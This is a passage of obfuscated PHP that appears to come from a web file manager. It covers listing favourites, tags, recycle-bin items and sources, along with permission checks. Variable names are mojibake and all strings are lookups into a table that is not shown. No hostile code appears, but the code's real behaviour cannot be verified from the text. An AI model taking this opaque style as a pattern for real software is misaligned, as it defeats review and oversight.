$_SERVER[÷åé¼î]; static $Ø¹Ó³ú = false; static $ÔœêÛ¡¹ = false; static $Š¬­Å÷½ = false; if (!$Ø¹Ó³ú) { $öäŠÏÂ² = $òÚÊïËú[462]; $öäŠÏÂ² .= $òÚÊïËú[463]; $öäŠÏÂ² .= $òÚÊïËú[464]; $ŒªÃ“½ = $òÚÊïËú[465]; $ÖŸ”Ø© = explode($òÚÊïËú[50], $ŒªÃ“½); $Ø¹Ó³ú = explode($òÚÊïËú[50], $öäŠÏÂ²); $ÔœêÛ¡¹ = array(); foreach ($Ø¹Ó³ú as $ËÂ’Üª¶) { if (in_array($ËÂ’Üª¶, $ÖŸ”Ø©)) { continue; } $ÔœêÛ¡¹[] = $ËÂ’Üª¶; } $Š¬­Å÷½ = explode($òÚÊïËú[50], $òÚÊïËú[466]); } foreach ($Š¬­Å÷½ as $Å‡¶«³) { if (isset($ø›·÷Æı[$Å‡¶«³])) { $ø›·÷Æı[$Å‡¶«³] = intval($ø›·÷Æı[$Å‡¶«³]); } } $ø›·÷Æı[$òÚÊïËú[87]] = $òÚÊïËú[467] . $ø›·÷Æı[$òÚÊïËú[193]] . $òÚÊïËú[468]; $ø›·÷Æı[$òÚÊïËú[33]] = $ø›·÷Æı[$òÚÊïËú[469]] == 1 ? $òÚÊïËú[78] : $òÚÊïËú[230]; $ø›·÷Æı[$òÚÊïËú[190]] = $this->typeName($ø›·÷Æı[$òÚÊïËú[190]]); if ($ø›·÷Æı[$òÚÊïËú[469]] != 1) { $ø›·÷Æı[$òÚÊïËú[169]] = $ø›·÷Æı[$òÚÊïËú[470]]; unset($ø›·÷Æı[$òÚÊïËú[470]]); } $¯çì£‚İ = $Ø¹Ó³ú; if (isset($ø›·÷Æı[$òÚÊïËú[471]]) && $ø›·÷Æı[$òÚÊïËú[471]][$òÚÊïËú[472]] == -1) { $¯çì£‚İ = $ÔœêÛ¡¹; } $ø›·÷Æı = array_field_key($ø›·÷Æı, $¯çì£‚İ); return $ø›·÷Æı; } public function listUserFav() { $¹³”Øì° =& $_SERVER[÷åé¼î]; $ÑÜ¹ôÒ´ = Model($¹³”Øì°[473])->listData(); $¹¶ëã = array_filter_by_field($ÑÜ¹ôÒ´, $¹³”Øì°[33], $¹³”Øì°[474]); $¹¶ëã = array_to_keyvalue($¹¶ëã, $¹³”Øì°[12], $¹³”Øì°[87]); if ($¹¶ëã) { $şœÇÒ«û = $this->listSource(array($¹³”Øì°[475] => array($¹³”Øì°[476], $¹¶ëã))); } $şœÇÒ«û = array_to_keyvalue($şœÇÒ«û[$¹³”Øì°[429]], $¹³”Øì°[193]); foreach ($ÑÜ¹ôÒ´ as &$€×İ‰Ø–) { $€×İ‰Ø– = array($¹³”Øì°[477] => $€×İ‰Ø–[$¹³”Øì°[459]], $¹³”Øì°[478] => $€×İ‰Ø–[$¹³”Øì°[32]], $¹³”Øì°[479] => $€×İ‰Ø–[$¹³”Øì°[87]], $¹³”Øì°[480] => $€×İ‰Ø–[$¹³”Øì°[33]], $¹³”Øì°[481] => $€×İ‰Ø–[$¹³”Øì°[231]], $¹³”Øì°[482] => $€×İ‰Ø–[$¹³”Øì°[88]]); if ($€×İ‰Ø–[$¹³”Øì°[33]] == $¹³”Øì°[474] && $şœÇÒ«û[$€×İ‰Ø–[$¹³”Øì°[87]]]) { $€×İ‰Ø–[$¹³”Øì°[90]] = $şœÇÒ«û[$€×İ‰Ø–[$¹³”Øì°[87]]]; } } unset($€×İ‰Ø–); return $ÑÜ¹ôÒ´; } public function listUserTag($áâ˜©Ìç) { $“Ö„âÛ¶ =& $_SERVER[÷åé¼î]; if ($áâ˜©Ìç && !is_array($áâ˜©Ìç)) { $áâ˜©Ìç = array($áâ˜©Ìç); } $ùİ±é‡ş = Model($“Ö„âÛ¶[483])->listData(); $áˆ®œŸ = array(); $õ§Á‚õ³ = array(); foreach ($ùİ±é‡ş as $µóÕ¶Íí) { $Ø±Ñ¿ = $µóÕ¶Íí[$“Ö„âÛ¶[87]]; if (!$Ø±Ñ¿) { continue; } if (!isset($õ§Á‚õ³[$Ø±Ñ¿])) { $õ§Á‚õ³[$Ø±Ñ¿] = array(); } $õ§Á‚õ³[$Ø±Ñ¿][] = $µóÕ¶Íí[$“Ö„âÛ¶[484]]; $áˆ®œŸ[$µóÕ¶Íí[$“Ö„âÛ¶[87]]] = $µóÕ¶Íí; } $¦ßÈÆÍ¨ = array(); $Óñé×ë = array(); $ÌÛÁëƒÎ = array(); foreach ($õ§Á‚õ³ as $òÃ”Áú› => $ää—ßÃÔ) { $Ä°¸ÉÈ = !0; if (!$áâ˜©Ìç) { $¦ßÈÆÍ¨[] = $òÃ”Áú›; continue; } foreach ($áâ˜©Ìç as $§Åñä”•) { if (!in_array($§Åñä”•, $ää—ßÃÔ)) { $Ä°¸ÉÈ = !1; break; } } if (!$Ä°¸ÉÈ) { continue; } if (!is_numeric($òÃ”Áú›)) { $‡¹û†ê = $áˆ®œŸ[$òÃ”Áú›]; $‘ª‰ÚŸ² = array($“Ö„âÛ¶[32] => $‡¹û†ê[$“Ö„âÛ¶[32]], $“Ö„âÛ¶[87] => $‡¹û†ê[$“Ö„âÛ¶[87]], $“Ö„âÛ¶[33] => $‡¹û†ê[$“Ö„âÛ¶[33]], $“Ö„âÛ¶[90] => array($“Ö„âÛ¶[485] => 1), $“Ö„âÛ¶[232] => !0); if ($‡¹û†ê[$“Ö„âÛ¶[33]] == $“Ö„âÛ¶[230]) { $ÌÛÁëƒÎ[] = $‘ª‰ÚŸ²; } if ($‡¹û†ê[$“Ö„âÛ¶[33]] == $“Ö„âÛ¶[78]) { $Óñé×ë[] = $‘ª‰ÚŸ²; } continue; } $¦ßÈÆÍ¨[] = $òÃ”Áú›; } if ($¦ßÈÆÍ¨) { $³‰°—Æı = $this->listSource(array($“Ö„âÛ¶[475] => array($“Ö„âÛ¶[476], $¦ßÈÆÍ¨))); } $³‰°—Æı = $³‰°—Æı ? $³‰°—Æı : array($“Ö„âÛ¶[85] => array(), $“Ö„âÛ¶[86] => array()); $³‰°—Æı[$“Ö„âÛ¶[85]] = array_merge($³‰°—Æı[$“Ö„âÛ¶[85]], $Óñé×ë); $³‰°—Æı[$“Ö„âÛ¶[86]] = array_merge($³‰°—Æı[$“Ö„âÛ¶[86]], $ÌÛÁëƒÎ); if (isset($³‰°—Æı[$“Ö„âÛ¶[426]]) && count($¦ßÈÆÍ¨) == $³‰°—Æı[$“Ö„âÛ¶[426]][$“Ö„âÛ¶[427]]) { return $³‰°—Æı; } $é·´õ = array(); $Ÿ³óÍ»‹ = array_to_keyvalue($³‰°—Æı[$“Ö„âÛ¶[85]], $“Ö„âÛ¶[12], $“Ö„âÛ¶[193]); $¢ïßŞ«ö = array_to_keyvalue($³‰°—Æı[$“Ö„âÛ¶[86]], $“Ö„âÛ¶[12], $“Ö„âÛ¶[193]); $÷ÀÌçÜ = array_merge($¢ïßŞ«ö, $Ÿ³óÍ»‹); foreach ($¦ßÈÆÍ¨ as $Ø±Ñ¿) { if (!in_array($Ø±Ñ¿, $÷ÀÌçÜ)) { $é·´õ[] = $Ø±Ñ¿; } } if ($é·´õ) { Model($“Ö„âÛ¶[486])->removeBySource($é·´õ); } return $³‰°—Æı; } public function listUserRecycle() { $ä©À¥ç„ =& $_SERVER[÷åé¼î]; $„ã¸ŸÎ‹ = Model($ä©À¥ç„[487])->listData(); if (!$„ã¸ŸÎ‹) { return array(); } $ÉÙŸûÊù = array($ä©À¥ç„[475] => array($ä©À¥ç„[476], $„ã¸ŸÎ‹), $ä©À¥ç„[488] => 1); return $this->listSource($ÉÙŸûÊù); } public function listSource($¼Ú˜Û­®, $ÉëµÈâ‡ = 3000, $å”«¨½ı = false) { $ûÂâûØ¶ =& $_SERVER[÷åé¼î]; if (!isset($¼Ú˜Û­®[$ûÂâûØ¶[489]])) { $¼Ú˜Û­®[$ûÂâûØ¶[489]] = 0; } if (isset($¼Ú˜Û­®[$ûÂâûØ¶[192]]) && $¼Ú˜Û­®[$ûÂâûØ¶[192]] == $ûÂâûØ¶[228]) { $¼Ú˜Û­®[$ûÂâûØ¶[470]] = array($ûÂâûØ¶[391], $ûÂâûØ¶[490]); } $¢ùš = $ûÂâûØ¶[491]; $ßõğ¹” = $this->field($¢ùš)->_makeOrder()->where($¼Ú˜Û­®)->selectPage($ÉëµÈâ‡); $this->_listPageCheck($ßõğ¹”, $¢ùš, $¼Ú˜Û­®); $this->_listDataApply($ßõğ¹”[$ûÂâûØ¶[429]], $å”«¨½ı); $this->_listMake($ßõğ¹”); return $ßõğ¹”; } private function _listPageCheck(&$Ş€Ì¯´ä, $™ı£Ãş, $¡½ÒÑ’) { $õÃô­´ =& $_SERVER[÷åé¼î]; if (!is_array($Ş€Ì¯´ä[$õÃô­´[426]])) { return; } $Ò€ø¨Ï¾ = $Ş€Ì¯´ä[$õÃô­´[426]]; if ($Ò€ø¨Ï¾[$õÃô­´[428]] <= 1) { return; } if ($Ò€ø¨Ï¾[$õÃô­´[427]] >= 100000) { return; } if (Model($õÃô­´[492])->get($õÃô­´[493]) != $õÃô­´[494]) { return; } $™ı£Ãş = str_replace(array($õÃô­´[53], $õÃô­´[402], $õÃô­´[262]), $õÃô­´[12], $™ı£Ãş); $™ı£Ãş = $õÃô­´[495] . str_replace($õÃô­´[50], $õÃô­´[496], $™ı£Ãş) . $õÃô­´[497]; $ÇÄíÙÜ» = $õÃô­´[498]; $ÇÄíÙÜ» = $ÇÄíÙÜ» . $õÃô­´[499]; $Ô²÷‘À¤ = $Ò€ø¨Ï¾[$õÃô­´[423]] * ($Ò€ø¨Ï¾[$õÃô­´[413]] - 1) . $õÃô­´[50] . $Ò€ø¨Ï¾[$õÃô­´[423]]; $†Ğ“”ú = $this->_makeOrder(!0); $·Ï«Ë = $õÃô­´[495] . str_replace($õÃô­´[50], $õÃô­´[496], $†Ğ“”ú[0]); if (strpos($·Ï«Ë, $õÃô­´[500])) { $·Ï«Ë = str_replace($õÃô­´[500], $õÃô­´[501], $·Ï«Ë); } else { $·Ï«Ë .= $õÃô­´[502] . $†Ğ“”ú[1]; } $÷øşì­ú = array(); foreach ($¡½ÒÑ’ as $ã‡¥°Ôœ => $­ÓÄ“”ì) { $÷øşì­ú[$õÃô­´[495] . $ã‡¥°Ôœ] = $­ÓÄ“”ì; } $this->alias($õÃô­´[503])->field($™ı£Ãş)->limit($Ô²÷‘À¤)->order($·Ï«Ë); $„Òâ¼ê§ = $this->join($ÇÄíÙÜ»)->where($÷øşì­ú)->select(); if ($„Òâ¼ê§) { $Ş€Ì¯´ä[$õÃô­´[429]] = $„Òâ¼ê§; } } protected function _makeOrder($ƒ¤ğÉö„ = false) { $àúîˆç‰ =& $_SERVER[÷åé¼î]; $ñ¿²ü’£ = Model($àúîˆç‰[504])->get($àúîˆç‰[505]); $½ä”¡¸‹ = Model($àúîˆç‰[504])->get($àúîˆç‰[506]); $¥€••…İ = array($àúîˆç‰[507] => $àúîˆç‰[508], $àúîˆç‰[509] => $àúîˆç‰[510]); $å—„Î¶à = array($àúîˆç‰[32] => $àúîˆç‰[32], $àúîˆç‰[79] => $àúîˆç‰[79], $àúîˆç‰[169] => $àúîˆç‰[470], $àúîˆç‰[511] => $àúîˆç‰[511], $àúîˆç‰[512] => $àúîˆç‰[513], $àúîˆç‰[231] => $àúîˆç‰[231], $àúîˆç‰[88] => $àúîˆç‰[88]); $ş‰§²•ç = Input::get($àúîˆç‰[514], $àúîˆç‰[7], $ñ¿²ü’£, array_keys($å—„Î¶à)); $ıÏ‰¸ó = Input::get($àúîˆç‰[515], $àúîˆç‰[7], $½ä”¡¸‹, array_keys($¥€••…İ)); if (!in_array($ş‰§²•ç, array_keys($å—„Î¶à))) { $ş‰§²•ç = $àúîˆç‰[32]; } if (!in_array($ıÏ‰¸ó, array_keys($¥€••…İ))) { $ş‰§²•ç = $àúîˆç‰[507]; } if ($ş‰§²•ç == $àúîˆç‰[32]) { } $‰ã÷û = $àúîˆç‰[516] . $å—„Î¶à[$ş‰§²•ç] . $àúîˆç‰[53] . $¥€••…İ[$ıÏ‰¸ó]; $‰ã÷û = rtrim(trim($‰ã÷û), $àúîˆç‰[50]); if ($ƒ¤ğÉö„) { return array($‰ã÷û, $¥€••…İ[$ıÏ‰¸ó]); } return $this->order($‰ã÷û); } protected function _listDataApplyItem($“»öÑêØ, $¾˜æ‡ó‘ = false) { $ØëĞ…í¹ = array($“»öÑêØ); $this->_listDataApply($ØëĞ…í¹, $¾˜æ‡ó‘); return $ØëĞ…í¹[0]; } protected function _listDataApply(&$ÃÁòûíğ, $ŞæÒÖ¢Ä = false) { $¸ğ©¤áÀ =& $_SERVER[÷åé¼î]; if (!$ÃÁòûíğ) { $ÃÁòûíğ = array(); return; } $Ü”È‹¼Ó = array_to_keyvalue($ÃÁòûíğ, $¸ğ©¤áÀ[12], $¸ğ©¤áÀ[193]); $Ü”È‹¼Ó = array_unique($Ü”È‹¼Ó); $this->_listSourceCache($ÃÁòûíğ); if (!$ŞæÒÖ¢Ä) { $this->_listAppendMeta($ÃÁòûíğ, $Ü”È‹¼Ó); $this->_listAppendFileMeta($ÃÁòûíğ, $Ü”È‹¼Ó); $this->_listAppendChildren($ÃÁòûíğ, $Ü”È‹¼Ó); } $this->_listAppendPath($ÃÁòûíğ); $this->_listAppendAuth($ÃÁòûíğ); $this->_listAppendSourceInfo($ÃÁòûíğ, $Ü”È‹¼Ó); $this->_listAppendUser($ÃÁòûíğ); $this->_listFilterInfo($ÃÁòûíğ, $ŞæÒÖ¢Ä); $this->_listAppendAuthSecret($ÃÁòûíğ); } protected function _listSourceCache($ÄÃ¡·Ä§) { $÷†Èû¥ =& $_SERVER[÷åé¼î]; foreach ($ÄÃ¡·Ä§ as $›³²±ŒÏ) { self::$cacheSourceInfo[$÷†Èû¥[517] . $›³²±ŒÏ[$÷†Èû¥[193]]] = $›³²±ŒÏ; } } protected function _listFilterInfo(&$·†¿š²é, $ãüµâ¹­ = false) { $¸‘­ûÛ¶ =& $_SERVER[÷åé¼î]; foreach ($·†¿š²é as &$€ŠëÍ¢) { $€ŠëÍ¢ = $this->pathInfoFilter($€ŠëÍ¢); self::$cachePathInfo[$¸‘­ûÛ¶[518] . intval($ãüµâ¹­) . $¸‘­ûÛ¶[446] . $€ŠëÍ¢[$¸‘­ûÛ¶[193]]] = $€ŠëÍ¢; } unset($€ŠëÍ¢); } protected function _listMake(&$û·³ê¬) { $®ÚåìÚ  =& $_SERVER[÷åé¼î]; $û·³ê¬[$®ÚåìÚ [85]] = array(); $û·³ê¬[$®ÚåìÚ [86]] = array(); foreach ($û·³ê¬[$®ÚåìÚ [429]] as $ÆêÂÄ) { $ŸÁ³Û÷– = $ÆêÂÄ[$®ÚåìÚ [469]] == 1 ? $®ÚåìÚ [85] : $®ÚåìÚ [86]; $û·³ê¬[$ŸÁ³Û÷–][] = $ÆêÂÄ; } unset($û·³ê¬[$®ÚåìÚ [429]]); } protected function _listAppendMeta(&$ñûÜô˜¹, $Ø½è •) { $ê›†•­â =& $_SERVER[÷åé¼î]; $ş¬€€Ÿ  = array($ê›†•­â[475] => array($ê›†•­â[476], $Ø½è •)); $ˆ¿¢øŞÒ = Model($ê›†•­â[519])->field($ê›†•­â[520])->where($ş¬€€Ÿ )->select(); if (!$ˆ¿¢øŞÒ) { return; } $şÙæï¾Š = array($ê›†•­â[521], $ê›†•­â[522], $ê›†•­â[501]); $ïÓ«„« = array(); foreach ($ˆ¿¢øŞÒ as $” –†¯ô) { if (!isset($ïÓ«„«[$” –†¯ô[$ê›†•­â[193]]])) { $ïÓ«„«[$” –†¯ô[$ê›†•­â[193]]] = array(); } if (in_array($” –†¯ô[$ê›†•­â[97]], $şÙæï¾Š)) { continue; } $ïÓ«„«[$” –†¯ô[$ê›†•­â[193]]][$” –†¯ô[$ê›†•­â[97]]] = $” –†¯ô[$ê›†•­â[434]]; } foreach ($ñûÜô˜¹ as &$é¥Ë¼“ì) { $é¥Ë¼“ì[$ê›†•­â[523]] = !1; if (isset($ïÓ«„«[$é¥Ë¼“ì[$ê›†•­â[193]]])) { $é¥Ë¼“ì[$ê›†•­â[523]] = $ïÓ«„«[$é¥Ë¼“ì[$ê›†•­â[193]]]; } if ($this->fileIsLock($é¥Ë¼“ì) && $é¥Ë¼“ì[$ê›†•­â[471]]) { $‡º¿’Æ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $é¥Ë¼“ì[$ê›†•­â[471]][$ê›†•­â[472]] = AuthModel::authDisable($é¥Ë¼“ì[$ê›†•­â[471]][$ê›†•­â[472]], $‡º¿’Æ); $é¥Ë¼“ì[$ê›†•­â[471]][$ê›†•­â[524]][$ê›†•­â[471]] = $é¥Ë¼“ì[$ê›†•­â[471]][$ê›†•­â[472]]; } } unset($é¥Ë¼“ì); } protected function _listAppendFileMeta(&$ÄÅ×Í, $ù§š®™÷) { $æüÍ şŒ =& $_SERVER[÷åé¼î]; $¯õ€ø‘® = array_to_keyvalue($ÄÅ×Í, $æüÍ şŒ[12], $æüÍ şŒ[525]); $¯õ€ø‘® = array_filter(array_unique($¯õ€ø‘®)); if (!$¯õ€ø‘®) { return; } $™Ë¨‚İ´ = array($æüÍ şŒ[526] => array($æüÍ şŒ[476], $¯õ€ø‘®)); $Á‹šÒÄì = $æüÍ şŒ[527]; $‚ã„Ê…” = Model($æüÍ şŒ[528])->field($Á‹šÒÄì)->where($™Ë¨‚İ´)->select(); $‚ã„Ê…” = array_to_keyvalue($‚ã„Ê…”, $æüÍ şŒ[525]); $‰ õ˜ûÇ = Model($æüÍ şŒ[529])->field($æüÍ şŒ[530])->where($™Ë¨‚İ´)->select(); $‰ õ˜ûÇ = $‰ õ˜ûÇ ? $‰ õ˜ûÇ : array(); $ÆêÌ©…Ç = array(); foreach ($‰ õ˜ûÇ as $ˆÃšÉİ) { if (!isset($ÆêÌ©…Ç[$ˆÃšÉİ[$æüÍ şŒ[525]]])) { $ÆêÌ©…Ç[$ˆÃšÉİ[$æüÍ şŒ[525]]] = array(); } $ÆêÌ©…Ç[$ˆÃšÉİ[$æüÍ şŒ[525]]][$ˆÃšÉİ[$æüÍ şŒ[97]]] = $ˆÃšÉİ[$æüÍ şŒ[434]]; } foreach ($ÄÅ×Í as &$À‚ã’÷œ) { $ò»ñœ®å = $À‚ã’÷œ[$æüÍ şŒ[525]]; if (!$ò»ñœ®å || !is_array($‚ã„Ê…”[$ò»ñœ®å])) { continue; } $üëö¯é® = $‚ã„Ê…”[$ò»ñœ®å]; $üëö¯é®[$æüÍ şŒ[79]] = $À‚ã’÷œ[$æüÍ şŒ[79]]; $üëö¯é®[$æüÍ şŒ[32]] = $À‚ã’÷œ[$æüÍ şŒ[32]]; if (!$üëö¯é®[$æüÍ şŒ[531]]) { Model($æüÍ şŒ[528])->fileMd5Check($üëö¯é®); } if (!isset(self::$cacheFileInfo[$æüÍ şŒ[532] . $ò»ñœ®å])) { self::$cacheFileInfo[$æüÍ şŒ[532] . $ò»ñœ®å] = array_merge(array(), $üëö¯é®); } unset($‚ã„Ê…”[$ò»ñœ®å][$æüÍ şŒ[87]]); $¥Çæ­± = isset($ÆêÌ©…Ç[$ò»ñœ®å]) && is_array($ÆêÌ©…Ç[$ò»ñœ®å]) ? $ÆêÌ©…Ç[$ò»ñœ®å] : array(); $À‚ã’÷œ[$æüÍ şŒ[170]] = array_merge($¥Çæ­±, $‚ã„Ê…”[$ò»ñœ®å]); if (isset($À‚ã’÷œ[$æüÍ şŒ[170]][$æüÍ şŒ[184]])) { $À‚ã’÷œ[$æüÍ şŒ[184]] = json_decode($À‚ã’÷œ[$æüÍ şŒ[170]][$æüÍ şŒ[184]], !0); unset($À‚ã’÷œ[$æüÍ şŒ[170]][$æüÍ şŒ[184]]); } } unset($À‚ã’÷œ); } protected function _listAppendSourceInfo(&$¼Ú‡´ªŞ, $¢”ÌÎÉ) { $ÅåÎïÇá =& $_SERVER[÷åé¼î]; $è¯ ÎÍï = Model($ÅåÎïÇá[533])->listData(); $äÜÂ¸Ê = Model($ÅåÎïÇá[483])->listData(); $µÊÛ®¬ô = Model($ÅåÎïÇá[473])->listData(); $¢‘²İ’³ = Model($ÅåÎïÇá[534])->listSimple(); $‘çÂ„š = array_to_keyvalue($è¯ ÎÍï, $ÅåÎïÇá[459]); $±ƒÑ×æ = array_to_keyvalue_group($äÜÂ¸Ê, $ÅåÎïÇá[87], $ÅåÎïÇá[484]); $¹¡ÇÒ¬ = array_to_keyvalue($µÊÛ®¬ô, $ÅåÎïÇá[87]); $›Ë¾¢Ï = array_to_keyvalue_group($¢‘²İ’³, $ÅåÎïÇá[193]); foreach ($¼Ú‡´ªŞ as &$ùÍ²È†‰) { $ùÍ²È†‰[$ÅåÎïÇá[90]] = array($ÅåÎïÇá[535] => 0, $ÅåÎïÇá[536] => 0, $ÅåÎïÇá[537] => 0); if (isset($¹¡ÇÒ¬[$ùÍ²È†‰[$ÅåÎïÇá[193]]])) { $ùÍ²È†‰[$ÅåÎïÇá[90]][$ÅåÎïÇá[538]] = 1; $ùÍ²È†‰[$ÅåÎïÇá[90]][$ÅåÎïÇá[539]] = $¹¡ÇÒ¬[$ùÍ²È†‰[$ÅåÎïÇá[193]]][$ÅåÎïÇá[32]]; } if ($±ƒÑ×æ && $‘çÂ„š && isset($±ƒÑ×æ[$ùÍ²È†‰[$ÅåÎïÇá[193]]])) { $ùÍ²È†‰[$ÅåÎïÇá[90]][$ÅåÎïÇá[540]] = array(); foreach ($±ƒÑ×æ[$ùÍ²È†‰[$ÅåÎïÇá[193]]] as $´½§ÀŒ) { $ÍÂî›˜® = $‘çÂ„š[$´½§ÀŒ]; $ùÍ²È†‰[$ÅåÎïÇá[90]][$ÅåÎïÇá[540]][] = array($ÅåÎïÇá[541] => $ÍÂî›˜®[$ÅåÎïÇá[459]], $ÅåÎïÇá[478] => $ÍÂî›˜®[$ÅåÎïÇá[32]], $ÅåÎïÇá[542] => $ÍÂî›˜®[$ÅåÎïÇá[543]]); } } if ($›Ë¾¢Ï && isset($›Ë¾¢Ï[$ùÍ²È†‰[$ÅåÎïÇá[193]]])) { $ùÍ²È†‰[$ÅåÎïÇá[90]][$ÅåÎïÇá[544]] = array(); foreach ($›Ë¾¢Ï[$ùÍ²È†‰[$ÅåÎïÇá[193]]] as $²áËêß) { $ßä²µÌö = $ÅåÎïÇá[545]; if ($²áËêß[$ÅåÎïÇá[546]] == $ÅåÎïÇá[91]) { $ßä²µÌö .= $ÅåÎïÇá[547]; } $ùÍ²È†‰[$ÅåÎïÇá[90]][$ÅåÎïÇá[544]] = array_field_key($²áËêß, explode($ÅåÎïÇá[50], $ßä²µÌö)); } } } unset($ùÍ²È†‰); return $¼Ú‡´ªŞ; } protected function _listAppendChildren(&$ƒö“ëÌˆ, $¦£à¸×Â) { $ùÖô® =& $_SERVER[÷åé¼î]; $ËÓ¸¾ïü = array(); $ÀÅº…åå = array($ùÖô®[239] => 0, $ùÖô®[240] => 0); foreach ($ƒö“ëÌˆ as &$èÒÜ¼â½) { if (!$èÒÜ¼â½[$ùÖô®[469]]) { continue; } $ËÓ¸¾ïü[] = $èÒÜ¼â½[$ùÖô®[193]]; } unset($èÒÜ¼â½); if (!$ËÓ¸¾ïü) { return; } $¢¶¹Ã€¸ = array($ùÖô®[192] => array($ùÖô®[7], $ËÓ¸¾ïü), $ùÖô®[489] => 0); $‹øÛ¢ë = array($ùÖô®[192], $ùÖô®[469], $ùÖô®[548] => $ùÖô®[549]); $ òüğÙî = $this->field($‹øÛ¢ë)->where($¢¶¹Ã€¸)->group($ùÖô®[550])->select(); $Ö§ã›ÍÏ = array(); foreach ($ òüğÙî as $ĞÈÕÉ) { $àãÒ¿Ôß = $ĞÈÕÉ[$ùÖô®[192]]; $ã§Õ±òí = $ĞÈÕÉ[$ùÖô®[469]] == $ùÖô®[91] ? $ùÖô®[240] : $ùÖô®[239]; if (!isset($Ö§ã›ÍÏ[$àãÒ¿Ôß])) { $Ö§ã›ÍÏ[$àãÒ¿Ôß] = array($ùÖô®[239] => 0, $ùÖô®[240] => 0); } $Ö§ã›ÍÏ[$àãÒ¿Ôß][$ã§Õ±òí] += $ĞÈÕÉ[$ùÖô®[549]]; } foreach ($ƒö“ëÌˆ as &$èÒÜ¼â½) { if (!$èÒÜ¼â½[$ùÖô®[469]]) { continue; } $ğ¿ˆ¬• = is_array($Ö§ã›ÍÏ[$èÒÜ¼â½[$ùÖô®[193]]]) ? $Ö§ã›ÍÏ[$èÒÜ¼â½[$ùÖô®[193]]] : $ÀÅº…åå; $èÒÜ¼â½[$ùÖô®[240]] = $ğ¿ˆ¬•[$ùÖô®[240]]; $èÒÜ¼â½[$ùÖô®[239]] = $ğ¿ˆ¬•[$ùÖô®[239]]; unset($èÒÜ¼â½[$ùÖô®[470]]); } unset($èÒÜ¼â½); } protected function _listAppendAuth(&$ì‚¾ºŸù) { $•²±î”à =& $_SERVER[÷åé¼î]; $Ë¤ÉøŞ± = array(); foreach ($ì‚¾ºŸù as $í±ëÉÕ‡) { if ($í±ëÉÕ‡[$•²±î”à[190]] == self::TYPE_GROUP) { $Ë¤ÉøŞ±[] = $í±ëÉÕ‡[$•²±î”à[193]]; } } if (!$Ë¤ÉøŞ±) { return; } $–·­ıÓÌ = array_to_keyvalue($ì‚¾ºŸù, $•²±î”à[193]); $öşÈ¶× = Model($•²±î”à[551])->getSourceList($Ë¤ÉøŞ±, $–·­ıÓÌ); $Ä›Ñ×îˆ = KodUser::isRoot(); foreach ($ì‚¾ºŸù as $ëè±öà± => &$í±ëÉÕ‡) { $í±ëÉÕ‡[$•²±î”à[471]] = $öşÈ¶×[$í±ëÉÕ‡[$•²±î”à[193]]]; if (!$í±ëÉÕ‡[$•²±î”à[471]] && $í±ëÉÕ‡[$•²±î”à[190]] == self::TYPE_GROUP) { $í±ëÉÕ‡[$•²±î”à[471]] = Action($•²±î”à[552])->pathGroupAuthMake($í±ëÉÕ‡[$•²±î”à[553]]); if (!$í±ëÉÕ‡[$•²±î”à[471]] && !$Ä›Ñ×îˆ) { $í±ëÉÕ‡[$•²±î”à[233]] = !1; $í±ëÉÕ‡[$•²±î”à[232]] = !1; } } if ($í±ëÉÕ‡[$•²±î”à[471]]) { $í±ëÉÕ‡[$•²±î”à[233]] = AuthModel::authCheckEdit($í±ëÉÕ‡[$•²±î”à[471]][$•²±î”à[472]]); $í±ëÉÕ‡[$•²±î”à[232]] = AuthModel::authCheckView($í±ëÉÕ‡[$•²±î”à[471]][$•²±î”à[472]]); } $this->groupPathDisplay($í±ëÉÕ‡); } unset($í±ëÉÕ‡); } public function _listAppendAuthSecret(&$»±ßßğ°) { $•º’¡Î =& $_SERVER[÷åé¼î]; if (Model($•º’¡Î[492])->get($•º’¡Î[554]) != $•º’¡Î[91]) { return; } static $‰Ù˜«ç£ = false; if (!$‰Ù˜«ç£) { $Á×ô“ê‘ = Model($•º’¡Î[555]); $¹¢–ïçá = Model($•º’¡Î[556]); $‰Ù˜«ç£ = $¹¢–ïçá->listData(); $‰Ù˜«ç£ = array_to_keyvalue($‰Ù˜«ç£, $•º’¡Î[193]); $á‘³ÂÕ = json_decode(Model($•º’¡Î[492])->get($•º’¡Î[557]), !0); $á‘³ÂÕ = array_to_keyvalue($á‘³ÂÕ, $•º’¡Î[459]); foreach ($‰Ù˜«ç£ as $ÊÈ­ƒ¥ı => $öÀ¾ï‚) { $üúÑ¦‘È = $á‘³ÂÕ[$öÀ¾ï‚[$•º’¡Î[558]]]; if (!$üúÑ¦‘È) { $¹¢–ïçá->remove($öÀ¾ï‚[$•º’¡Î[459]]); unset($‰Ù˜«ç£[$ÊÈ­ƒ¥ı]); continue; } $¬Ìßò¸½ = $Á×ô“ê‘->listData($üúÑ¦‘È[$•º’¡Î[471]]); if (!$¬Ìßò¸½) { $¹¢–ïçá->remove($öÀ¾ï‚[$•º’¡Î[459]]); unset($‰Ù˜«ç£[$ÊÈ­ƒ¥ı]); continue; } $öÀ¾ï‚[$•º’¡Î[471]] = $¬Ìßò¸½; $öÀ¾ï‚[$•º’¡Î[559]] = $üúÑ¦‘È; $öÀ¾ï‚[$•º’¡Î[560]] = Model($•º’¡Î[561])->getInfoSimpleOuter($öÀ¾ï‚[$•º’¡Î[511]]); $‰Ù˜«ç£[$ÊÈ­ƒ¥ı] = $öÀ¾ï‚; } } $ª•ëèâÇ = USER_ID; $îšÏÖ€Â = array(); $éÄŸ“ó = $this->_listAppendPath($îšÏÖ€Â, !0); foreach ($»±ßßğ° as $ÊÈ­ƒ¥ı => &$öÀ¾ï‚) { if (!is_array($öÀ¾ï‚[$•º’¡Î[471]])) { continue; } if ($öÀ¾ï‚[$•º’¡Î[190]] != $•º’¡Î[562]) { continue; } if (isset($‰Ù˜«ç£[$öÀ¾ï‚[$•º’¡Î[193]]])) { $ã¸­ö× = $‰Ù˜«ç£[$öÀ¾ï‚[$•º’¡Î[193]]]; if (!is_array($öÀ¾ï‚[$•º’¡Î[523]])) { $öÀ¾ï‚[$•º’¡Î[523]] = array(); } $öÀ¾ï‚[$•º’¡Î[523]][$•º’¡Î[563]] = $ã¸­ö×[$•º’¡Î[558]]; $öÀ¾ï‚[$•º’¡Î[471]][$•º’¡Î[564]] = $ã¸­ö×; $öÀ¾ï‚[$•º’¡Î[471]][$•º’¡Î[565]] = $öÀ¾ï‚[$•º’¡Î[566]]; $öÀ¾ï‚[$•º’¡Î[471]][$•º’¡Î[567]] = $•º’¡Î[91]; if ($ã¸­ö×[$•º’¡Î[511]] != $ª•ëèâÇ) { $öÀ¾ï‚[$•º’¡Î[471]][$•º’¡Î[472]] = 